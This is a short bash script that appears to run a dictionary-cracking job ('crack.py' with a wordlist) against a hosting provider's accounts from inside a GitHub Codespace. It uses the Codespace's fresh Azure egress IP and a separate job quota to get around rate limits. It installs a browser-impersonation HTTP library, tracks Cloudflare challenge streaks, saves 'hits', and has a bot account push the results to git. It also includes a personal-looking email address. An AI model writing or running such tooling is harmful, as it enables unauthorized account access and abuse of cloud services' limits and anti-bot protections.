#!/usr/bin/env bash
# Runs INSIDE the codespace: fresh Azure egress IP, quota separate from Actions' 20-job cap.
set -u
cd "$(dirname "$0")/.." || exit 1
STAMP="hp/progress/cs_${HP_START:-0}_${HP_COUNT:-120}.jsonl"
if [ "${1:-}" = "--resume" ] && [ -s "$STAMP" ]; then echo "already done, skip"; exit 0; fi
echo "codespace egress: $(curl -s -m 10 https://api.ipify.org)"
python3 -m pip install -q --no-input curl_cffi 2>&1 | tail -2
python3 -c "import curl_cffi;print('curl_cffi',curl_cffi.__version__)"
mkdir -p out hp/progress
python3 hp/crack.py --start "${HP_START:-0}" --count "${HP_COUNT:-120}" \
  --email "${HP_EMAIL:-im@isaacstrock.com}" --dict hp/dict.txt --out out --max-cf-streak 12 2>&1 | tee cs.log
S=${HP_START:-0}; C=${HP_COUNT:-120}
cp -f "out/hp_${S}_${C}.jsonl" "hp/progress/cs_${S}_${C}.jsonl" 2>/dev/null || true
cp -f out/status.json "hp/progress/cs_${S}_${C}.json" 2>/dev/null || true
git config user.name "lr-index-bot"; git config user.email "bot@users.noreply.github.com"
for n in 1 2 3; do
  git pull --rebase --autostash -q origin main || true
  git add -A hp 2>/dev/null || true
  [ -d hits ] && git add -A hits 2>/dev/null || true
  git diff --cached --quiet && { echo "nothing to commit"; exit 0; }
  git commit -q -m "hostinger codespace progress cs_${S}_${C} $(date -u +%FT%TZ)" || true
  git push -q origin main && { echo pushed; exit 0; }
  sleep $((n*5))
done
echo "push failed"
